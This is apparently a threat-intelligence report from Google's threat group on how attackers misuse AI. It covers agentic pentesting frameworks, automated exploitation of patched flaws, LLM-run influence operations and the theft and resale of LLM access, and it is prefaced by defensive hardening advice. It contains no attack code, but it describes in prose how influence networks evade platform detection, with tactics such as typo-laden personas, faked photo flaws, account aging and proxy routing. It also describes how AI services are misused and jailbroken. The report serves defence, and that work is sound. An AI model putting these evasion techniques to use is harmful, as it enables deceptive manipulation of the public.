Enforce Phishing-Resistant MFA (FIDO2 / WebAuthn): Replace SMS, voice, and push notifications with hardware security keys (e.g., Titan Security Keys). Hardware keys are bound to the origin URL and cannot be intercepted by AiTM reverse proxies or approved via fatigue attacks.

Restrict and Audit Passkey Registrations: Monitor identity logs for passkey registrations and rogue device enrollments, particularly on administrative accounts.

Harden MFA Registration: Require existing administrators or out-of-band identity verification to approve new MFA devices or secondary authenticators (such as Microsoft Authenticator or passkeys).

Organizations and individuals may consider enrolling in the Advanced Protection Program.

Session Management & Incident Response

Mandate Session & OAuth Revocation in BEC Playbooks: When remediating suspected account compromise, password changes alone are insufficient. Administrators must immediately revoke all active browser sessions, refresh tokens, and authorized third-party OAuth app permissions across both Google Workspace and Microsoft Entra ID, and remove any unauthorized passkeys, backup codes, or MFA devices.

Audit Third-Party OAuth Grants: Continuously review authorized third-party applications in Google Workspace and Microsoft 365, flagging unexpected native desktop email clients (e.g., Thunderbird) or external mail services (e.g., Proton Mail).

Network & Infrastructure Controls

Detect & Block Residential Proxy Logons: Restrict administrative access from consumer ISPs, VPNs, and known residential proxy ASN ranges (e.g., AS5650, AS20115).

Cross-Cloud DLP Policies: Deploy Data Loss Prevention (DLP) rules across cloud storage (Google Drive, OneDrive, SharePoint) to alert on documents containing sensitive terms (e.g., passwords, roster, .pst) or to restrict mass external file-sharing.

Title: GTIG AI Threat Tracker: Agentic Threat Activity Crosses a Significant Threshold
Context: We found that LLMs are transforming not only the speed of vulnerability discovery and exploitation, but also the types and risk profiles of the flaws being uncovered
Full Text:
Written by: Aurora Blum, Kelli Vanderlee, Jess Xia, David Mainor

Executive Summary

As threat actors increasingly move beyond basic prompting to deploying autonomous multi-agent frameworks, automated vulnerability exploitation pipelines, and alternative monetization schemes like LLMJacking, the adversarial AI landscape has reached a critical inflection point. In this update, Google Threat Intelligence Group (GTIG) and Mandiant examine how adversaries across the cyber crime, espionage, and information operations spectrum are operationalizing generative AI to compress attack timelines, scale operations, and execute multi-stage intrusions at machine speed.

Key trends over the last quarter include:

Shift to Autonomous Workflows and Multi-Agent Frameworks: Adversary tradecraft has continued to transition beyond manual prompting to deploying autonomous multi-agent offensive frameworks—such as ARTEX, CAIRN, CyberStrikeAI, and PentAGI—to execute multi-stage intrusions at greater operational velocity.

Automated Vulnerability Research and Exploitation: Threat actors are increasingly leveraging LLMs and agentic frameworks to fully automate the reverse engineering of patches via differential analysis, allowing them to rapidly weaponize n-day vulnerabilities and scale exploitation pipelines against internet-facing servers without human intervention.

Monetization and Infrastructure Abuse: Financially motivated threat actors continue to profit from LLMJacking by stealing LLM credentials and cloud resources from compromised enterprise environments and reselling access to high-performance AI models through underground proxy services (e.g., LLM Mixers).

LLM Integration in Information Operations (IO): State-sponsored groups, commercial Influence-as-a-Service (IaaS) vendors, and inauthentic political monetization networks now routinely use LLMs in their operations to produce synthetic media at scale, create localized personas, and automate cross-platform distribution.

Targeted Espionage and Supply Chain Evolution: Cyber espionage groups are leveraging LLMs for target research, automated data analysis, and novel supply chain attack vectors—such as manipulating autonomous coding assistant configurations to drop backdoors during local execution.

Grounded in telemetry from frontline Mandiant incident response engagements, global threat actor tracking, and live platform defenses, this report details how state-sponsored espionage groups, financially motivated cyber criminals, and IO threat actors are operationalizing LLMs in the wild.

At Google, we are committed to developing AI boldly and responsibly. Our multifaceted defense strategy integrates proactive model-level safeguards, specialized threat intelligence, and targeted containment protocols to protect our customers and infrastructure. We continuously harden our models against misuse, mitigate malicious activity through proactive disruption of bad actor projects and accounts, and use our autonomous Google AI Threat Defense architecture and BeyondZero to operationalize security, continuous monitoring, and responding at machine speed across enterprise environments.

Multi-Agent Frameworks in Cyber Intrusions

While previous milestones documented in our quarterly research highlighted nascent adversary interest in agentic capabilities, GTIG and Mandiant have now observed multiple threat actors abusing open source, agentic penetration-testing (pentesting) frameworks to automate discrete phases and specific operational tasks during live intrusions.

Threat actor adoption of these frameworks represents a paradigm shift towards intrusions occurring at machine speed, with the automated chaining of complex attack paths scaling operations significantly. While the mechanics of the intrusions remain the same, such as using compromised credentials and targeting unpatched systems, the speed and scale at which frameworks can exploit these known weaknesses introduces a new defensive challenge.

Figure 1: Multi-agent LLM offensive frameworks

In addition to the now highly-publicized pentesting tool ARTEX, threat actors are actively leveraging additional open source, multi-agent frameworks such as CAIRN, CyberStrikeAI, and PentAGI. We have also observed evidence of threat actor experimentation with custom-built harnesses. These frameworks share several core capabilities: discovering and exploiting low-complexity vulnerabilities, using LLMs to generate single-use payloads on-demand, and using real-time execution feedback to dynamically adjust tactics.

GTIG has independently observed open source tools CAIRN and PentAGI deployed in the wild, and has seen experimentation with CyberStrikeAI and HexStrike AI.

CAIRN: an open source, multi-agent pentesting framework that implements an OODA (Observe, Orient, Decide, Act) loop where specialized agents collaborate via a shared "blackboard" to autonomously navigate from an initial parameter (e.g., a target IP address) toward an operational objective. GTIG observed CAIRN used in intrusion activity against targets including in the aerospace sector in the US.

CyberStrikeAI: an open source, LLM-native offensive framework which functions as a "single pane of glass" for cyber operations. The core architecture consists of a Go-based backend API acting as a C2 and orchestration server and connects commercial and open-weight LLMs to over 100 security tools, YAML attack recipes, and custom scripts to automate end-to-end attack chains.

HexStrike AI: an open source offensive Model Context Protocol (MCP)-integrated harness that enables LLM clients to directly connect to over 150 pre-installed offensive security tools. Operating through a dual-component architecture, the framework wraps standard utilities across reconnaissance, web application testing, exploitation, and binary analysis into callable functions coordinated by more than 12 specialized autonomous sub-agents.

PentAGI: an open source autonomous offensive framework designed to lower technical barriers for entry-level operators running complex campaigns. Between late August and early October 2026, GTIG tracked a threat actor using a customized attack orchestration platform built off of the open source version of PentAGI used to conduct systematic reconnaissance and vulnerability scanning against a wide range of organizations in Asia.

We have observed several threat actors separately experimenting with the use of these frameworks and harnesses, including financially motivated, as well as suspected espionage threat actors with a PRC nexus. This includes evidence that a PRC-nexus group was developing its own automated attack framework for likely use in cyber espionage operations. These observations additionally extend to the use of other tools and services, such as ZeroHollow, an inference service used for exploit development and LLM routing, and Agent Zero, an open source agent framework which features autonomous code execution and dynamic tool generation.

Given the low barrier to entry, ease of integrating new exploits, and massive scaling potential, we believe it is highly likely that threat actors will continue to use these frameworks in campaigns targeting organizations globally. Concurrently, as capabilities evolve, we suspect these operations will continue to move further along the autonomous scale, approaching fully agentic intrusions. Notably, while these frameworks are capable of significantly compressing attack timelines to machine speed and achieving operational objectives, they currently trade stealth for velocity. Unrestricted autonomous execution generates forensic traffic, relies on recognizable identifiers, and leaves behind distinct code-level traces; while these artifacts increase the likelihood of detection and mitigation, these tools remain highly capable of achieving operational objectives. As the sophistication of these tools and underlying LLMs increases, we anticipate not only reduced human involvement in these operations but also increased stealth and sophistication of the activity.

Mitigations

Google Security Operations (SecOps) has deployed specialized behavioral and volumetric rulepacks to detect use of ARTEX. Mandiant Consulting released a hardening guide and architectural defense framework specifically designed to counter the speed and scale advantage of adversaries using LLM-enabled offensive tooling.

Use of Agents in Vulnerability Research and Development

The integration of autonomous LLM agents into vulnerability research and software security workflows has shifted from theoretical experimentation to active operational deployment.

Adversaries are leveraging multi-agent systems and LLM-driven pipelines to automate labor-intensive phases of vulnerability analysis, such as differential patch examination, dynamic protocol fuzzing, and proof-of-concept (POC) weaponization. By chaining these capabilities together, threat actors can dramatically reduce the window between patch disclosure and weaponized exploitation. Threat actors may find it more efficient to use LLMs to rapidly weaponize patched n-day vulnerabilities, as they can focus research on a finite set of source materials: comparing source code versions (including from pre-release or preview channels), and examining release notes, security research, and POC code related to specific flaws. In contrast, searching for zero-day vulnerabilities requires casting a wider net. LLMs are transforming how vulnerabilities are discovered and exploited across public and enterprise infrastructure, shrinking the patch window for organizations. Simultaneously, the lower barrier to entry has fueled a wave of LLM-generated exploits that are claimed to work but don't, creating additional verification work for defenders.

For instance, in September 2026, GTIG analyzed vulnerability statistics to assess how LLMs are shaping the threat landscape. We found that LLMs are transforming not only the speed of vulnerability discovery and exploitation, but also the types and risk profiles of the flaws being uncovered. Interestingly, while overall disclosures and exploits nearly doubled between January and August 2026, zero-day exploits rose only marginally from a 2025 average of 8 per month to 11 per month in 2026—before spiking to 22 in the month of August.

Figure 3: Count of vulnerabilities exploited, by n-days and zero-days, January 2025 to August 2026

In our previous report, we detailed nascent efforts by threat actors surrounding LLM-augmented vulnerability research, including partially automated vulnerability scanning and exploitation attack sequences.

In the past quarter, GTIG identified threat actors using LLM frameworks to fully automate vulnerability discovery and exploitation without a human in the loop for the first time.

More specifically, GTIG identified an exposed staging server hosting a multi-agent vulnerability research and weaponization framework, dubbed exploit_agent, that integrates with multiple frontier and local LLMs. The framework is set up to conduct continuous differential analysis of popular web application software. It compares code before and after patch announcements, analyzes findings to identify potential vulnerabilities, drafts exploits, and automatically executes them without human intervention. Along with data exfiltrated from targeted victims, we identified multiple scripts capable of facilitating various post-compromise activities, including internal reconnaissance, brute-forcing, installing webshells, and removing other attackers’ webshells. Victim telemetry on the server suggests the operator was specifically interested in targeting French websites associated with the media and entertainment industries, as well as the education sector.

Open source research corroborates threat actor operationalization of fully automated vulnerability exploitation pipelines. For example, in late August 2026, threat actors exploited two vulnerabilities in PaperCut print management servers as zero-days that, when chained together, allow for unauthenticated remote code execution: CVE-2026-81578, an authentication bypass flaw; and CVE-2026-82078, an unsafe dynamic class loading vulnerability. Using LLMs, security researchers and the cybersecurity company Huntress generated working exploits for the vulnerabilities within a day of disclosure. Greynoise reported a campaign that took place four days after the initial disclosure in which a threat actor likely used LLMs to build and test exploits for these vulnerabilities, assemble a target list, and execute a widespread exploitation campaign against hundreds of organizations. Greynoise also highlighted the speed of execution, noting that the threat actor expanded an initial foothold to domain administrator within minutes.

The PHP vulnerabilities (CVE-2026-109618 and CVE-2026-109619) also highlight several of these trends. They were discovered using LLM-enabled analysis. Before official patches were released on Oct. 21, 2026, a POC video and early patched code were published. This allowed both researchers and attackers to compare code versions, understand the flaws and attempt to build exploits before the patch became available. In the initial days following the official patch, hundreds of claimed but non-functional POCs, likely generated with the help of LLMs, were published. This proliferation created significant work for the security community to verify or debunk the POCs while monitoring for evidence of confirmed exploitation.

Mitigations

Google continuously invests in AI innovation and research, helping to ensure AI is built responsibly, and that we’re leveraging its potential to automatically find risks. In 2024 we introduced Big Sleep, an AI agent developed by Google DeepMind and Google Project Zero, that actively searches and finds unknown security vulnerabilities in software. Google Cloud employs a defense-in-depth model that combines rigorous code reviews and secure-by-default libraries with continuous, automated scanning using specialized AI agents such as CodeMender to discover, patch, and remediate vulnerabilities before and after release. We partner with the global security community by running a Vulnerability Reward Program and maintaining Project Zero to proactively find and patch zero-day vulnerabilities.

Full Integration of LLMs into Information Operations

GTIG assesses with high confidence that information operations (IO) threat actors have advanced from initial LLM experimentation to full operational integration. Across all tracked categories—state-sponsored groups, including those attributed to Russia, the PRC, and Iran, commercial "Influence-as-a-Service" (IaaS) vendors, and inauthentic political monetization (IPM) networks—adversaries now routinely embed LLMs into their standard tradecraft to produce synthetic media and automate domain network workflows (e.g., LLM-assisted SEO manipulation, editing and formatting of seeded articles, and automated generation and publishing of influence content). This broad adoption has measurably improved the output quality of some long-running influence campaigns while enabling IPM networks to scale political clickbait that resembles the thematic focus, quality, and volume historically characteristic of state-backed IO campaigns. However, it is important to note that improvements in content quality do not necessarily equate to greater impact or success.

IO Actor Categories

State-sponsored groups are IO actors directly linked to state apparatuses and have traditionally formed the primary baseline tracked by platform defenders and researchers. To preserve plausible deniability, they increasingly rely on third-party commercial contractors to execute campaigns on their behalf.

Commercial IaaS vendors encompass marketing and PR agencies, private intelligence contractors, and offshoots of commercial surveillance vendors, selling services ranging from tailored influence campaigns to turnkey platforms. Tradecraft varies across this ecosystem; intelligence contractors and surveillance offshoots in particular often apply stronger operational security (OPSEC) and more advanced techniques than traditional state-sponsored actors.

Inauthentic political monetization (IPM) networks are driven by profit rather than ideology. These actors generate a high volume of political clickbait to drive engagement, maximize click-through rates, and boost ad revenue. This combination of political framing and high-volume synthetic content creates a significant frontend perception gap, making IPM network campaigns the most prone to being misidentified as state-sponsored operations.

As automated content generation reduces a primary operational bottleneck, adversaries are increasingly shifting their focus toward leveraging LLMs for infrastructure design, automated distribution pipelines, and anti-detection mechanisms. Specifically, our observations indicate a notable shift toward the commercial development of LLM-enabled, end-to-end IaaS platforms designed to support and automate the full influence campaign lifecycle. The proliferation of these platforms can lower operational overhead for state and commercial actors while increasing the difficulty of detecting coordinated and inauthentic behavior across social media platforms.

The Commercial Development of Turnkey, LLM-Enabled Influence Operations

In August 2026, GTIG investigated threat activity leveraging the Gemini API alongside tools from multiple AI providers to build an end-to-end IaaS platform designed to target public sentiment on regional political topics, primarily across Europe and the Middle East. The platform was engineered to automate the entire IO campaign lifecycle, including persona creation, multimodal media generation, automated content distribution, and interactive posting across platforms. Identified prompts reflected an operational focus on emulating organic grassroots engagement (i.e., “astroturfing”) while evading platform detection rules.

Identified prompts instructed models to adopt localized personas specific to targeted geography, mimicking regional dialects and slang, while incorporating informal phrasing and intentional typos to avoid sounding like an automated tool.

Prompts supporting media generation introduced deliberate camera flaws simulating realistic photos typically captured by smartphone cameras (e.g., making images appear grainy or incorporating uneven lighting changes) and omitted background text to avoid synthetic image markers.

To evade social media platform defenses, operators routed traffic through residential proxies and preserved saved login cookies. This setup was designed to allow automated tools to maintain active, authenticated access continuously, avoiding security checkpoints like CAPTCHAs and login re-verification.

GTIG also detected a separate commercial contractor leveraging the Gemini API—as part of a modular, multi-provider AI architecture—during the development of a turnkey IaaS platform engineered to manage over 100,000 accounts across major global platforms. The platform is architected to combine automated agents, anti-detection and device identifier spoofing tools, and cloud phone farms to operate thousands of inauthentic personas across platforms. Observed prompts indicated the actor’s plan to market the tool to both the actor’s domestic government bodies and foreign clients for influence campaign execution.

To manage large volumes of social media accounts, the platform was designed to run virtual smartphones in cloud environments—disguising each virtual device as a legitimate mobile device—and route web traffic through proxies to bypass automated bot detection and rate limits.

The architecture additionally includes automated fake account creation using disposable email addresses and overseas virtual SMS numbers. To avoid further suspicion, newly-created accounts were configured to undergo an automated aging period, leveraging LLMs to simulate realistic user behavior (e.g., how long a user lingers on a post, scrolling, and interacting with non-campaign content) to establish a history of normal activity before pushing targeted messaging.

Tactical LLM Adoption: Demographic Microtargeting and Content Scaling

Alongside the development of IaaS software suites, threat actors continue to integrate commercial LLM tools into baseline content workflows to overcome linguistic barriers, customize messaging, and scale output. Using commercial models to produce commentary, synthetic personas, and stylized animations at the content layer allows IO actors to improve the credibility and demographic resonance of their campaigns, while enabling IPM networks to mass-produce political clickbait for advertising revenue.

LLM-Enabled Quality Enhancement in Long-Running IaaS Campaign: Since our last report, GTIG observed a long-running IaaS provider tracked since 2019 leveraging LLMs to elevate the baseline quality and volume of its influence operations. Utilizing a proprietary software suite designed to manage thousands of synthetic profiles across major platforms, the provider targeted political discourse in multiple countries. Operators integrated LLM models to produce more convincing virtual personas, as well as academic-style commentary and media focused on political, religious, and civil rights topics. The resulting content was subsequently promoted and amplified across platforms using fabricated Western personas.

Demographic Targeting via Synthetic Content: We have observed threat actors using LLM-generated content to customize context for specific regions and audiences, for example by using synthetic influencer personas to promote policy narratives targeting specific demographics. A separate network posted synthetic, Lego brick-inspired animations and football parodies to satirize global political figures, likely in an attempt to appeal to younger audiences by effectively packaging propaganda in short-video formats consistent with popular internet culture.

LLM-Augmented Inauthentic Political Monetization (IPM): GTIG also tracks a growing trend of IPM actors using LLMs to mass-produce political content. Although their thematic focus, quality, and volume can resemble state-backed IO campaigns, these non-ideological operations exploit societal polarization solely to maximize engagement, click-through rates, and advertising revenue. GTIG has observed IPM operators prompting commercial LLMs to identify lucrative political topics, trending keywords, and high-Cost Per Mile (CPM) niches for ad monetization, while promoting the resulting content via synthetic news anchors that occasionally spoof the likenesses of real journalists and commentators to manufacture credibility.

Mitigations

GTIG collaborates closely with product teams to take action against IO actors across affected Google surfaces under our standard platform policies. Our research and rigorous analysis enables Google teams to make enforcement decisions and to disrupt coordinated IO campaigns. GITG, YouTube, and Google Trust & Safety track and regularly enforce on accounts associated with coordinated IO posting content and commenting. Examples of this enforcement include disruption of YouTube channels, blogs, AdSense accounts, and domains removed from Google News surfaces, as we report on a quarterly basis in the Influence Operations Bulletin.

Beyond enforcement actions, GTIG shares insights with Google DeepMind to harden our platforms and services against emerging tradecraft. This intelligence is used to establish abuse baselines, enhance Gemini’s ability to recognize and refuse misuse, and inform internal policy modifications.

Threat Actors Abusing and Monetizing Access to AI Tools

While compromised credentials have long served as the fundamental bedrock for initial access, privilege escalation, and lateral movement during intrusions, adversaries are increasingly repurposing stolen credentials and compute resources to power unauthorized LLM tooling and autonomous operational pipelines. As access costs, token rate limits, and geographic restrictions present persistent operational hurdles for threat actors attempting to scale LLM capabilities, adversaries are actively harvesting session tokens and platform credentials directly from victim endpoints and continuous integration environments. In tandem with this shift toward hijacking valid credentials for LLMs, underground cybercrime forums and illicit marketplaces have rapidly matured to meet this demand—transitioning beyond generic identity dumps to commodifying verified frontier AI accounts, tokenized API quotas, and targeted infostealer configurations as turnkey utilities for downstream exploitation.

LLMJacking in Incident Response

Throughout 2026, Mandiant responded to several LLMJacking incidents where financially motivated actors compromised cloud environments to consume targeted organizations’ cloud compute and/or LLM resource quotas. As seen in the image below, LLMJacking can generate significant usage and billing increases within hours. In some cases, single-day fraudulent charges exceeded $100,000 USD. In the most severe cases, cumulative resource abuse reached $1 million USD before remediation.

Figure 5: Usage chart showing LLMJacking generating a spike in API requests

In November, Mandiant and GTIG described a set of common TTPs we observed across intrusions that affected financial services, retail, transportation, and technology organizations in North America, South America, and the Asia Pacific region.

Attack Lifecycle Stage

Description of Observed Tactics

Initial Access

Threat actors frequently used credential theft and session hijacking to gain access to targeted environments, including harvesting valid credentials from public GitHub repositories, and social engineering using deceptive websites to trick users into providing active session tokens.

Internal Reconnaissance & Lateral Movement

Seeking to identify credentials and systems of interest, attackers conducted reconnaissance against internal code repositories, data stores, cloud services, containers, and access logs. In at least one case, a threat actor exploited a suspected web application vulnerability in a package running in an internal container to navigate to additional systems.

Privilege Escalation & Persistence

Threat actors created unauthorized IAM and service accounts or attached administrative policies to service roles. We also observed a threat actor exploit CVE-2026-40217, a sandbox escape in LiteLLM that allows an attacker to elevate limited-access inference keys ("Virtual Keys") into full administrative credentials. Privileged service accounts were sufficient to establish persistence without the use of malware.

Complete Mission: LLM Abuse

Inside organizations’ cloud environments, attackers enabled LLM services, including subscribing compromised accounts to pay-as-you-go agreements. To circumvent rate limits, one threat actor used a “burn and rotate” strategy, creating and deleting short-lived service accounts. Other threat actors abused cloud compute resources, provisioning instances with powerful GPUs and requesting quota increases in order to run their own LLM tooling. This included agentic frameworks that a threat actor used to automate further exploitation of the compromised network, as well as open source API gateways and custom relay infrastructure deployed to facilitate the sale of access to the compromised organization’s resources.

Table 3: Common TTPs observed in LLMJacking intrusions

In another investigation, we observed at least two separate attackers seeking to conduct LLMJacking operations. Both actors accessed a targeted environment using the same set of legitimate credentials, which were potentially sold or leaked on underground forums. The first threat actor used legitimate credentials to gain access to the environment, enumerate available LLM services, and query cost and usage information related to the account. On the same day, we observed a set of IP addresses using a common User-Agent, likely a botnet or proxy service, also accessing the environment using the same legitimate credentials. The botnet or proxy service generated millions of LLM API calls in approximately 24 hours before the credentials were revoked. Though the first threat actor returned to the environment, creating service accounts provisioned with permissions to query LLMs, the botnet’s noisy activity caused the compromised credentials to be remediated before this threat actor could execute LLM queries.

For hardening and mitigation guidance for defending against LLMJacking intrusions, please see our blog.

Monetizing LLMJacking through LLM Mixers

Threat actors frequently monetize LLMJacking intrusions by selling access to compromised compute and LLM resources. In addition to the rise of LLMJacking, GTIG is tracking the proliferation of “LLM Mixers”—illicit storefronts that provide buyers with unauthorized access to LLM services and underlying proxy infrastructure. This infrastructure routes buyer traffic through a pool of stolen credentials and compute instances to ensure reliable access, while also offering the ability to spread query volume across multiple victim environments to reduce the likelihood of detection.

The LLM Mixer ecosystem mirrors the broader cybercrime marketplace, where specialized threat groups handle discrete phases of the supply chain. While LLM Mixer operators maintain infrastructure and customer fulfillment, for example, operators may partner with separate threat actors who establish initial access to compromised environments, purchase compromised credentials from infostealer operators, or recruit partners to systematically register free trial accounts.

GTIG analyzed numerous LLMJacking vendor advertisements on Russian- and Chinese-language underground marketplaces, and found that most services offer access to multiple models, including frontier and jailbroken models that advertise support of malicious cyber activity. Advertised pricing varies significantly across individual mixer platforms and based on the models and types of credentials offered; for example, free trial credentials were much cheaper than enterprise. We observed prices per million tokens range from $0.10 USD to $25 USD. One vendor, APIMart, applies a 5x price increase on both input and output once a prompt exceeds 100,000 tokens. Rather than pricing per million tokens, some vendors such as JetNight offer monthly subscriptions at differing prices based on the type of model offered.
